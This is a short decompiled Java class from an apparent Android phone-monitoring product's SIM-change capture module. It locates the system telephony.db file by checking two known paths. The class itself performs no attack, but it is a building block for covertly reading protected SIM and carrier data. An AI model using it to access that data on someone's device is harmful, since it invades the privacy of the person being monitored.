package com.vvt.capture.simchange;

import java.io.File;

public class f
{
  public static String a()
  {
    int i = 0;
    String str1 = null;
    int j = 2;
    File[] arrayOfFile = new File[j];
    File localFile1 = new java/io/File;
    localFile1.<init>("/data/data/com.android.providers.telephony/databases/telephony.db");
    arrayOfFile[0] = localFile1;
    File localFile2 = new java/io/File;
    String str2 = "/dbdata/databases/com.android.providers.telephony/telephony.db";
    localFile2.<init>(str2);
    arrayOfFile[1] = localFile2;
    int k = arrayOfFile.length;
    for (;;)
    {
      if (i < k)
      {
        localFile2 = arrayOfFile[i];
        boolean bool = localFile2.exists();
        if (bool) {
          str1 = localFile2.getAbsolutePath();
        }
      }
      else
      {
        return str1;
      }
      i += 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */